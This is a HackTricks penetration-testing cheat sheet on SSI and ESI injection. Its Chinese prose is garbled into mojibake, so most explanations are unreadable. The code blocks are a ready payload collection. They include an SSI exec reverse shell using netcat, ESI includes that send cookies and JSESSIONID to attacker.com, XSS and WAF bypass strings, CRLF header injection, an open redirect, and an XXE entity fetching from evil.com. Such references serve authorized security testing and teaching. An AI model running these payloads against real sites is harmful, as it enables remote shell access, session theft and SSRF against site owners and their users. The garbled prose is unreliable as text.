# æœåŠ¡å™¨ç«¯åŒ…å«/è¾¹ç¼˜ç«¯åŒ…å«æ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## æœåŠ¡å™¨ç«¯åŒ…å«åŸºæœ¬ä¿¡æ¯

**(ä»‹ç»æ‘˜è‡ª[Apacheæ–‡æ¡£](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰æ˜¯æ”¾ç½®åœ¨HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œ**åœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œè¯„ä¼°**ï¼Œè€Œé¡µé¢æ­£åœ¨æä¾›æ—¶ã€‚å®ƒä»¬è®©æ‚¨å¯ä»¥**å‘ç°æœ‰HTMLé¡µé¢æ·»åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹**ï¼Œè€Œæ— éœ€é€šè¿‡CGIç¨‹åºæˆ–å…¶ä»–åŠ¨æ€æŠ€æœ¯æä¾›æ•´ä¸ªé¡µé¢ã€‚\
ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥å°†æŒ‡ä»¤æ”¾å…¥ç°æœ‰çš„HTMLé¡µé¢ä¸­ï¼Œå¦‚ï¼š

`<!--#echo var="DATE_LOCAL" -->`

å½“æä¾›é¡µé¢æ—¶ï¼Œæ­¤ç‰‡æ®µå°†è¢«è¯„ä¼°å¹¶æ›¿æ¢ä¸ºå…¶å€¼ï¼š

`Tuesday, 15-Jan-2013 19:28:54 EST`

ä½•æ—¶ä½¿ç”¨SSIï¼Œä½•æ—¶è®©é¡µé¢å®Œå…¨ç”±æŸä¸ªç¨‹åºç”Ÿæˆï¼Œé€šå¸¸å–å†³äºé¡µé¢çš„é™æ€éƒ¨åˆ†æœ‰å¤šå°‘ï¼Œä»¥åŠæ¯æ¬¡æä¾›é¡µé¢æ—¶éœ€è¦é‡æ–°è®¡ç®—å¤šå°‘ã€‚SSIæ˜¯å‘é¡µé¢æ·»åŠ å°å—ä¿¡æ¯çš„ç»ä½³æ–¹å¼ï¼Œä¾‹å¦‚ä¸Šé¢æ˜¾ç¤ºçš„å½“å‰æ—¶é—´ã€‚ä½†æ˜¯ï¼Œå¦‚æœé¡µé¢çš„å¤§éƒ¨åˆ†æ˜¯åœ¨æä¾›æ—¶ç”Ÿæˆçš„ï¼Œæ‚¨éœ€è¦å¯»æ‰¾å…¶ä»–è§£å†³æ–¹æ¡ˆã€‚

å¦‚æœWebåº”ç”¨ç¨‹åºä½¿ç”¨æ‰©å±•åä¸º\*\* `.shtml`ã€`.shtm`æˆ–`.stm` \*\*çš„æ–‡ä»¶ï¼Œåˆ™å¯ä»¥æ¨æ–­å­˜åœ¨SSIï¼Œä½†æƒ…å†µå¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚

å…¸å‹çš„SSIè¡¨è¾¾å¼å…·æœ‰ä»¥ä¸‹æ ¼å¼ï¼š
```
<!--#directive param="value" -->
```
### æ£€æŸ¥
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## è¾¹ç¼˜åŒ…å«

åœ¨ç¼“å­˜ä¿¡æ¯æˆ–åŠ¨æ€åº”ç”¨ç¨‹åºæ—¶å¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œå› ä¸ºå†…å®¹çš„ä¸€éƒ¨åˆ†å¯èƒ½ä¼šåœ¨ä¸‹æ¬¡æ£€ç´¢å†…å®¹æ—¶å‘ç”Ÿå˜åŒ–ã€‚è¿™å°±æ˜¯ESIçš„ç”¨é€”ï¼Œé€šè¿‡ä½¿ç”¨ESIæ ‡è®°æŒ‡ç¤ºéœ€è¦åœ¨å‘é€ç¼“å­˜ç‰ˆæœ¬ä¹‹å‰ç”Ÿæˆçš„åŠ¨æ€å†…å®¹ã€‚\
å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåœ¨ç¼“å­˜å†…å®¹ä¸­æ³¨å…¥ESIæ ‡è®°ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥åœ¨å°†æ–‡æ¡£å‘é€ç»™ç”¨æˆ·ä¹‹å‰æ³¨å…¥ä»»æ„å†…å®¹ã€‚

### ESIæ£€æµ‹

ä»æœåŠ¡å™¨å“åº”ä¸­çš„ä»¥ä¸‹æ ‡å¤´è¡¨ç¤ºæœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨ESIï¼š
```
Surrogate-Control: content="ESI/1.0"
```
å¦‚æœæ‚¨æ‰¾ä¸åˆ°æ­¤æ ‡å¤´ï¼Œåˆ™æœåŠ¡å™¨**å¯èƒ½ä»åœ¨ä½¿ç”¨ESI**ã€‚\
**ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²ç›®åˆ©ç”¨æ–¹æ³•**ï¼Œå› ä¸ºè¯·æ±‚åº”è¯¥å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESIåˆ©ç”¨

[GoSecureåˆ›å»ºäº†](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)ä¸€å¼ è¡¨ï¼Œä»¥äº†è§£æˆ‘ä»¬å¯ä»¥é’ˆå¯¹ä¸åŒæ”¯æŒESIçš„è½¯ä»¶å°è¯•çš„å¯èƒ½æ”»å‡»ï¼Œå…·ä½“å–å†³äºæ”¯æŒçš„åŠŸèƒ½ï¼š

* **Includes**ï¼šæ”¯æŒ`<esi:includes>`æŒ‡ä»¤
* **Vars**ï¼šæ”¯æŒ`<esi:vars>`æŒ‡ä»¤ã€‚ç”¨äºç»•è¿‡XSSè¿‡æ»¤å™¨
* **Cookie**ï¼šæ–‡æ¡£cookieå¯è¢«ESIå¼•æ“è®¿é—®
* **Upstream Headers Required**ï¼šé™¤éä¸Šæ¸¸åº”ç”¨ç¨‹åºæä¾›å¤´éƒ¨ï¼Œå¦åˆ™ä»£ç†åº”ç”¨ç¨‹åºå°†ä¸ä¼šå¤„ç†ESIè¯­å¥
* **Host Allowlist**ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒESIåŒ…å«ä»…å¯èƒ½æ¥è‡ªå…è®¸çš„æœåŠ¡å™¨ä¸»æœºï¼Œä¾‹å¦‚ï¼Œåªæœ‰å¯¹è¿™äº›ä¸»æœºæ‰å¯èƒ½è¿›è¡ŒSSRF

|         **è½¯ä»¶**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :----------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|         Squid3           |      æ˜¯      |    æ˜¯    |     æ˜¯      |              æ˜¯               |         å¦         |
|      Varnish Cache       |      æ˜¯      |    å¦    |     å¦      |              æ˜¯               |         æ˜¯         |
|         Fastly           |      æ˜¯      |    å¦    |     å¦      |              å¦               |         æ˜¯         |
| Akamai ESI æµ‹è¯•æœåŠ¡å™¨ (ETS) |      æ˜¯      |    æ˜¯    |     æ˜¯      |              å¦               |         å¦         |
|       NodeJS esi         |      æ˜¯      |    æ˜¯    |     æ˜¯      |              å¦               |         å¦         |
|      NodeJS nodesi       |      æ˜¯      |    å¦    |     å¦      |              å¦               |      å¯é€‰çš„       |

#### XSS

ä»¥ä¸‹ESIæŒ‡ä»¤å°†åœ¨æœåŠ¡å™¨å“åº”ä¸­åŠ è½½ä»»æ„æ–‡ä»¶
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### ç»•è¿‡å®¢æˆ·ç«¯ XSS ä¿æŠ¤
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### çªƒå– Cookie

* è¿œç¨‹çªƒå– cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* é€šè¿‡åœ¨å“åº”ä¸­åå°„XSSæ¥çªƒå–HTTP\_ONLY cookieï¼š
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### ç§æœ‰æœ¬åœ°æ–‡ä»¶

ä¸è¦å°†å…¶ä¸â€œæœ¬åœ°æ–‡ä»¶åŒ…å«â€æ··æ·†ï¼š
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) refers to the sequence of characters used to denote a line break in HTTP headers. It consists of the ASCII characters 13 (CR) followed by 10 (LF). Attackers can exploit CRLF injection vulnerabilities to manipulate HTTP responses, perform header injection attacks, and potentially execute malicious actions.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### å¼€æ”¾å¼é‡å®šå‘

ä»¥ä¸‹å†…å®¹å°†å‘å“åº”æ·»åŠ ä¸€ä¸ª `Location` å¤´éƒ¨
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### æ·»åŠ æ ‡é¢˜

* åœ¨å¼ºåˆ¶è¯·æ±‚ä¸­æ·»åŠ æ ‡é¢˜
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* åœ¨å“åº”ä¸­æ·»åŠ æ ‡å¤´ï¼ˆç”¨äºç»•è¿‡å¸¦æœ‰ XSS çš„å“åº”ä¸­çš„ "Content-Type: text/json"ï¼‰
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### åœ¨æ·»åŠ æ ‡å¤´æ—¶çš„ CRLF (**CVE-2019-2438)**
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamaiè°ƒè¯•

è¿™å°†å‘é€åŒ…å«åœ¨å“åº”ä¸­çš„è°ƒè¯•ä¿¡æ¯ï¼š
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

é€šè¿‡ä¸º_dca_å‚æ•°æŒ‡å®š`xslt`å€¼ï¼Œå¯ä»¥å®ç°åŸºäº**`eXtensible Stylesheet Language Transformations (XSLT)`**çš„ESIåŒ…å«ã€‚è¿™ç§åŒ…å«å¯¼è‡´HTTPä»£ç†æœåŠ¡å™¨æ£€ç´¢XMLå’ŒXSLTæ–‡ä»¶ï¼Œåè€…è¿‡æ»¤å‰è€…ã€‚è¿™äº›XMLæ–‡ä»¶å¯ç”¨äº_XML External Entity (XXE)_æ”»å‡»ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡ŒSSRFæ”»å‡»ã€‚ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•çš„æ•ˆç”¨æœ‰é™ï¼Œå› ä¸ºESIåŒ…å«æœ¬èº«å·²ç»ä½œä¸ºSSRFå‘é‡ã€‚ç”±äºåº•å±‚Xalanåº“ä¸æ”¯æŒï¼Œå¤–éƒ¨DTDä¸ä¼šè¢«å¤„ç†ï¼Œä»è€Œé˜²æ­¢æœ¬åœ°æ–‡ä»¶æå–ã€‚
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLTæ–‡ä»¶ï¼š
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
æ£€æŸ¥XSLTé¡µé¢ï¼š

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### å‚è€ƒèµ„æ–™

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
